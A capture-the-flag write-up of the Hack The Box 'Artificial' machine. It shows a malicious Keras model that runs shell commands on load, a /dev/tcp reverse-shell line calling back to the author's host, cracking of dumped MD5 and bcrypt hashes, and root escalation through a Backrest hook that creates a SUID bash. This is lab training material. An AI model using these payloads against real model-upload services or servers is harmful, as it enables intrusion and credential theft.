---
layout: post
title: Hack The Box Walkthrough - Artificial
date: 2025-10-25
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2025/10/HTB/Artificial
img: 2025/10/Artificial/Artificial.png
---

In Artificial, I used Remote Code Execution to get a shell, cracked some password hashes, and exploited a backup application to elevate my privileges.

* Room: Artificial
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Artificial](https://app.hackthebox.com/machines/Artificial)
* Author: [FisMatHack](https://app.hackthebox.com/users/1076236)

## Enumeration

I started the machine by running `rustscan` to check for open ports

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.210.114:22
Open 10.129.210.114:80
^[[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 17:59 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.

...

Host is up, received reset ttl 63 (0.036s latency).
Scanned at 2025-07-05 17:59:52 EDT for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNABz8gRtjOqG4+jUCJb2NFlaw1auQlaXe1/+I+BhqrriREBnu476PNw6mFG9ifT57WWE/qvAZQFYRvPupReMJD4C3bE3fSLbXAoP03+7JrZkNmPRpVetRjUwP1acu7golA8MnPGzGa2UW38oK/TnkJDlZgRpQq/7DswCr38IPxvHNO/15iizgOETTTEU8pMtUm/ISNQfPcGLGc0x5hWxCPbu75OOOsPt2vA2qD4/sb9bDCOR57bAt4i+WEqp7Ri/act+f4k6vypm1sebNXeYaKapw+W83en2LnJOU0lsdhJiAPKaD/srZRZKOR0bsPcKOqLWQR/A6Yy3iRE8fcKXzfbhYbLUiXZzuUJoEMW33l8uHuAza57PdiMFnKqLQ6LBfwYs64Q3v8oAn5O7upCI/nDQ6raclTSigAKpPbliaL0HE/P7UhNacrGE7Gsk/FwADiXgEAseTn609wBnLzXyhLzLb4UVu9yFRWITkYQ6vq4ZqsiEnAsur/jt8WZY6MQ8=
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdlb8oU9PsHX8FEPY7DijTkQzsjeFKFf/xgsEav4qedwBUFzOetbfQNn3ZrQ9PMIHrguBG+cXlA2gtzK4NPohU=
|   256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH8QL1LMgQkZcpxuylBjhjosiCxcStKt8xOBU0TjCNmD
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/5%OT=22%CT=%CU=30128%PV=Y%DS=2%DC=T%G=N%TM=6869A064%
OS:P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1
OS:=M577ST11NW7%O2=M577ST11NW7%O3=M577NNT11NW7%O4=M577ST11NW7%O5=M577ST11NW
OS:7%O6=M577ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=
OS:Y%DF=Y%T=40%W=FAF0%O=M577NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%R
OS:D=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=4
OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 19.632 days (since Mon Jun 16 02:49:46 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   38.33 ms 10.10.14.1
2   39.20 ms target (10.129.210.114)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:00
Completed NSE at 18:00, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.63 seconds
           Raw packets sent: 38 (2.458KB) | Rcvd: 25 (1.730KB)
```

Port 22 (SSH) and 80 (HTTP) were open. The server on port 80 was redirecting to 'artificial.htb' so I added that domain to my hosts file.

I ran scans for UDP ports and subdomains. They did not find anything.

## TensorFlow

I launched a browser and took a look at the site on port 80.

![Website](/assets/images/2025/10/Artificial/Website.png "Website")

The site talked about building and testing AI models.

There was also some code that showed how to build a model. 

![Example Code](/assets/images/2025/10/Artificial/ExampleCode.png "Example Code")

The code used [TensorFlow](https://www.tensorflow.org/) to build the model.

The site also had links to login and register new accounts. I ran `feroxbuster` to look for hidden pages. It found a dashboard page that redirected to the login page.

```bash
$ feroxbuster -u http://artificial.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://artificial.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       28l       60w      857c http://artificial.htb/login
200      GET       33l       65w      952c http://artificial.htb/register
302      GET        5l       22w      189c http://artificial.htb/logout => http://artificial.htb/
200      GET       33l       73w      999c http://artificial.htb/static/js/scripts.js
200      GET      313l      666w     6610c http://artificial.htb/static/css/styles.css
200      GET      161l      472w     5442c http://artificial.htb/
302      GET        5l       22w      199c http://artificial.htb/dashboard => http://artificial.htb/login
[####################] - 3m    119608/119608  0s      found:7       errors:3
[####################] - 3m    119601/119601  632/s   http://artificial.htb/
```

I created an account. 

![Register](/assets/images/2025/10/Artificial/Register.png "Register")

Once connected, I was presented with a form to upload AI models.

![Connected](/assets/images/2025/10/Artificial/Connected.png "Connected")

The requirements link had a file that contained only one line.

```
tensorflow-cpu==2.13.1
```

The Dockerfile was simple.

```docker
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

I tried uploading the example code, but it did not appear to do anything. 

The example model looked like some Python code, so I thought that it would be simple to get it to execute malicious code. I looked for exploits for TensorFlow and found a [blog post](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model). The post had this line that confirmed what I thought: `models are programs which Tensorflow's runtime interprets and executes`. It also had a [GitHub repository](https://github.com/Splinter0/tensorflow-rce) with code to exploit it.

I used the provided Docker file to test the payloads.

```bash
 $ docker build .
[+] Building 0.4s (8/8) FINISHED                                       docker:default
 => [internal] load build definition from Dockerfile                             0.0s
 => => transferring dockerfile: 496B                                             0.0s
 => [internal] load metadata for docker.io/library/python:3.8-slim               0.3s
 => [internal] load .dockerignore                                                0.0s
 => => transferring context: 2B                                                  0.0s
 => [1/4] FROM docker.io/library/python:3.8-slim@sha256:1d52838af602b4b5a831beb  0.0s
 => CACHED [2/4] WORKDIR /code                                                   0.0s
 => CACHED [3/4] RUN apt-get update &&     apt-get install -y curl &&     curl   0.0s
 => CACHED [4/4] RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_  0.0s
 => exporting to image                                                           0.0s
 => => exporting layers                                                          0.0s
 => => writing image sha256:e3ab5da58879d7274a5d5d4ddcae2a28e238b713585a2fa3e7e  0.0s


$ docker run -v .:/mounted -i -t e3ab5da58879

root@33a64cbc0fd5:/code# cd /mounted/

root@33a64cbc0fd5:/mounted# ls
Dockerfile  exploit.h5  exploit.py  model.py
```

Once connected, I used `exploit.py` example from the GitHub repository to build a model to test the exploit.

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system('ls -la')
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

```bash
root@33a64cbc0fd5:/mounted# python exploit.py
2025-07-06 18:44:08.253948: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2, in other operations, rebuild TensorFlow with the appropriate compiler flags.
/usr/local/lib/python3.8/site-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via `model.save()`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save('my_model.keras')`.
  saving_api.save_model(
```

I uploaded the model.

![Uploaded Model](/assets/images/2025/10/Artificial/UploadedModel.png "Uploaded Model")

And I clicked on 'View Predictions' to see if I would get the result of the `ls` command.

![Model Predictions](/assets/images/2025/10/Artificial/ModelPredictions.png "Model Predictions")

It did not show the listing, but it did not display any errors. So I tried to get a reverse shell by changing the `os.system` line and regenerating the model.

```python
os.system('bash -c "bash  -i >& /dev/tcp/10.10.14.183/4444 0>&1"')
```

I uploaded the new model. And when I clicked on 'View Predictions' I got a hit on my netcat listener.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.183] from (UNKNOWN) [10.129.26.155] 36564
bash: cannot set terminal process group (947): Inappropriate ioctl for device
bash: no job control in this shell

app@artificial:~/app$ whoami
whoami
app
```

## Password Cracking

Once I got the reverse shell, I started looking around the server. The application code was using a sqlite database.

```python
from flask import Flask, render_template, request, redirect, url_for, session, send_file, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.utils import secure_filename
import os
import tensorflow as tf
import hashlib
import uuid
import numpy as np
import io
from contextlib import redirect_stdout
import hashlib

app = Flask(__name__)
app.secret_key = "Sup3rS3cr3tKey4rtIfici4L"

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'models'

db = SQLAlchemy(app)
...
```

I found the database.

```bash
app@artificial:~$ find . -name users.db       
./app/instance/users.db
```

I connected to it and quickly found a few password hashes.

```sql
app@artificial:~$ sqlite3 app/instance/users.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
model  user 
sqlite> Select * From user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|eric|eric@test.com|e10adc3949ba59abbe56e057f20f883e
```

I copied the hashes to my machine and used `hashcat` to crack them.

```bash
$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt --username -m0
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6848/13760 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 6 digests; 6 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip

....

e10adc3949ba59abbe56e057f20f883e:123456
c99175974b6e192936d97224638a34f8:REDACTED
bc25b1f80f544c0ab451c02a3dca9fc6:REDACTED
Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hash.txt
Time.Started.....: Sun Jul  6 09:07:00 2025 (2 secs)
Time.Estimated...: Sun Jul  6 09:07:02 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7664.1 kH/s (0.23ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 3/6 (50.00%) Digests (total), 3/6 (50.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[216361726f6c696e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 38%

Started: Sun Jul  6 09:06:59 2025
Stopped: Sun Jul  6 09:07:03 2025


$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt --username -m0 --show
gael@artificial.htb:c99175974b6e192936d97224638a34f8:REDACTED
royer@artificial.htb:bc25b1f80f544c0ab451c02a3dca9fc6:REDACTED
eric@test.com:e10adc3949ba59abbe56e057f20f883e:123456
```

I used the cracked password to reconnect as gael and read the user flag.

```bash
$ ssh gael@target
The authenticity of host 'target (10.129.26.155)' can't be established.
ED25519 key fingerprint is SHA256:RfqGfdDw0WXbAPIqwri7LU4OspmhEFYPijXhBj6ceHs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
gael@target's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 06 Jul 2025 01:08:04 PM UTC

...

Last login: Sun Jul 6 13:08:05 2025 from 10.10.14.183
gael@artificial:~$ ls
user.txt

gael@artificial:~$ cat user.txt
REDACTED
```

## Backrest

Once connected as gael, I looked at the usual easy escalation paths.

```bash
gael@artificial:~$ sudo -l
[sudo] password for gael:
Sorry, user gael may not run sudo on artificial.

gael@artificial:~$ find / -perm /u=s 2>/dev/null
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/passwd
/usr/bin/at
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign

gael@artificial:~$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

I did not see anything I could exploit. `ps` only showed the processes for my users.

```bash
gael@artificial:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
gael        1402  0.0  0.2  19076  9372 ?        Ss   13:08   0:00 /lib/systemd/systemd --user
gael        1531  0.0  0.1   8408  5384 pts/1    Ss   13:08   0:00 -bash
gael        1661  0.0  0.0   8888  3232 pts/1    R+   13:11   0:00 ps aux
```

I looked around the server and found a folder that contained [Backrest](https://github.com/garethgeorge/backrest), a backup utility.

```bash
gael@artificial:~$ ls /opt/
backrest

gael@artificial:~$ ls /opt/backrest/
backrest  install.sh  jwt-secret  oplog.sqlite  oplog.sqlite.lock  oplog.sqlite-shm  oplog.sqlite-wal  processlogs  restic  tasklogs

gael@artificial:~$ ls -la /opt/backrest/
total 51116
drwxr-xr-x 5 root root         4096 Jul  6 13:10 .
drwxr-xr-x 3 root root         4096 Mar  4 22:19 ..
-rwxr-xr-x 1 app  ssl-cert 25690264 Feb 16 19:38 backrest
drwxr-xr-x 3 root root         4096 Mar  3 21:27 .config
-rwxr-xr-x 1 app  ssl-cert     3025 Mar  3 04:28 install.sh
-rw------- 1 root root           64 Mar  3 21:18 jwt-secret
-rw-r--r-- 1 root root        77824 Jul  6 13:10 oplog.sqlite
-rw------- 1 root root            0 Mar  3 21:18 oplog.sqlite.lock
-rw-r--r-- 1 root root        32768 Jul  6 13:10 oplog.sqlite-shm
-rw-r--r-- 1 root root            0 Jul  6 13:10 oplog.sqlite-wal
drwxr-xr-x 2 root root         4096 Mar  3 21:18 processlogs
-rwxr-xr-x 1 root root     26501272 Mar  3 04:28 restic
drwxr-xr-x 3 root root         4096 Jul  6 13:10 tasklogs
```

There were some sqlite databases. But they did not contain anything useful. The documentation for Backrest shows it running on port 9898. I checked for the ports on the server and it was listening to this port on localhost.


```bash
gael@artificial:/opt/backrest$ ss -tunl
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                              0.0.0.0:*
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*
tcp                     LISTEN                   0                        4096                                           127.0.0.1:9898                                            0.0.0.0:*
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                              0.0.0.0:*
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                              0.0.0.0:*
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*
tcp                     LISTEN                   0                        2048                                           127.0.0.1:5000                                            0.0.0.0:*
tcp                     LISTEN                   0                        511                                                 [::]:80                                                 [::]:*
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*
```

I created an SSH tunnel and looked at the website in a browser.

```bash
$ ssh -L 9898:localhost:9898 gael@target
```

![Backrest Login](/assets/images/2025/10/Artificial/BackrestLogin.png "Backrest Login")

I got a login page. I looked for default credentials. Backrest did not have any, it forces the creation of a user when it's installed. I tried admin/admin and combinations of all the usernames and passwords I had found. None of them worked. I looked for known vulnerabilities in Backrest 1.7.2, and didn't find any. There was a configuration file that could have been interesting, but I could not read it.

After searching for a while, I ran [linPEAS](https://github.com/peass-ng/PEASS-ng) on the server to see if it would detect anything of interest. It found a backup archive of Backrest that I could read because I was part of the `sysadm` group.

```bash
gael@artificial:~$ ./linpeas.sh | tee res.txt
...

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root gael 33 Jul  6 15:46 /home/gael/user.txt
-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz
...


gael@artificial:/tmp/tmp.l2FJLxcyFj$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

I copied the backup, extracted its content, and read the configuration file. Weirdly, the file had a `gz` extension, but it was not a gzip file.

```bash
gael@artificial:/tmp/tmp.l2FJLxcyFj$ cp /var/backups/backrest_backup.tar.gz .

gael@artificial:/tmp/tmp.l2FJLxcyFj$ gunzip backrest_backup.tar.gz

gzip: backrest_backup.tar.gz: not in gzip format

gael@artificial:/tmp/tmp.l2FJLxcyFj$ file backrest_backup.tar.gz
backrest_backup.tar.gz: POSIX tar archive (GNU)

gael@artificial:/tmp/tmp.l2FJLxcyFj$ tar -xvf backrest_backup.tar.gz
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh

gael@artificial:/tmp/tmp.l2FJLxcyFj$ ls backrest/
backrest  install.sh  jwt-secret  oplog.sqlite  oplog.sqlite.lock  oplog.sqlite-shm  oplog.sqlite-wal  processlogs  restic  tasklogs

gael@artificial:/tmp/tmp.l2FJLxcyFj$ ls -l backrest/.config/backrest/config.json
-rw------- 1 gael gael 280 Mar  4 22:17 backrest/.config/backrest/config.json

gael@artificial:/tmp/tmp.l2FJLxcyFj$ cat backrest/.config/backrest/config.json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

The configuration file contained a field called `passwordBcrypt`. The value looked like base64, so I decoded it and saved it to a before using `hashcat` to crack it.

```bash
$ echo -n JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d > hash2.txt

$ cat hash2.txt
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO%

$ hashcat -a0 hash2.txt /usr/share/seclists/rockyou.txt  -m 3200
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6848/13760 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

...

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP5...Zz/0QO
Time.Started.....: Sun Jul  6 12:12:36 2025 (55 secs)
Time.Estimated...: Sun Jul  6 12:13:31 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       98 H/s (5.55ms) @ Accel:6 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5400/14344384 (0.04%)
Rejected.........: 0/5400 (0.00%)
Restore.Point....: 5364/14344384 (0.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: b123456 -> hayden1
Hardware.Mon.#1..: Util: 92%

Started: Sun Jul  6 12:11:55 2025
Stopped: Sun Jul  6 12:13:33 2025
```

I used the found credentials to connect to Backrest.

![Backrest Logged In](/assets/images/2025/10/Artificial/BackrestLogedIn.png "Backrest Logged In")

I tried creating a backup plan. It required a repository, so I created one using a local path.

![Add Restic Repository](/assets/images/2025/10/Artificial/AddResticRepository.png "Add Restic Repository")

Then I created a plan that used the new repository.

![Create Backup Plan](/assets/images/2025/10/Artificial/CreateBackupPlan.png "Create Backup Plan")

I added a command hook to the plan that copied `/bin/bash` in `/tmp` and made it `suid`.

![Add Hook](/assets/images/2025/10/Artificial/AddHook.png "Add Hook")

I ran the backup.

![Backup Now](/assets/images/2025/10/Artificial/BackupNow.png "Backup Now")

I looked in `/tmp`. The copy of bash was in there with the `suid` bit set. I used it to become root and read the root flag.

```bash
gael@artificial:/tmp$ ls -ltr
total 1172
drwx------ 3 root root    4096 Jul  6 15:45 systemd-private-d82ddc7784e54caeb4116bd8c1bbbc02-systemd-timesyncd.service-qm9Q9e
drwx------ 3 root root    4096 Jul  6 15:45 systemd-private-d82ddc7784e54caeb4116bd8c1bbbc02-systemd-logind.service-UFtDof
drwx------ 3 root root    4096 Jul  6 15:45 systemd-private-d82ddc7784e54caeb4116bd8c1bbbc02-ModemManager.service-kwhBbj
drwx------ 3 root root    4096 Jul  6 15:46 systemd-private-d82ddc7784e54caeb4116bd8c1bbbc02-systemd-resolved.service-hV3O5h
-rw-r--r-- 1 root root       0 Jul  6 16:21 testrepo
-rwsr-sr-x 1 root root 1183448 Jul  6 16:21 bash

gael@artificial:/tmp$ /tmp/bash -p

bash-5.0# whoami
root

bash-5.0# cat /root/root.txt
REDACTED
```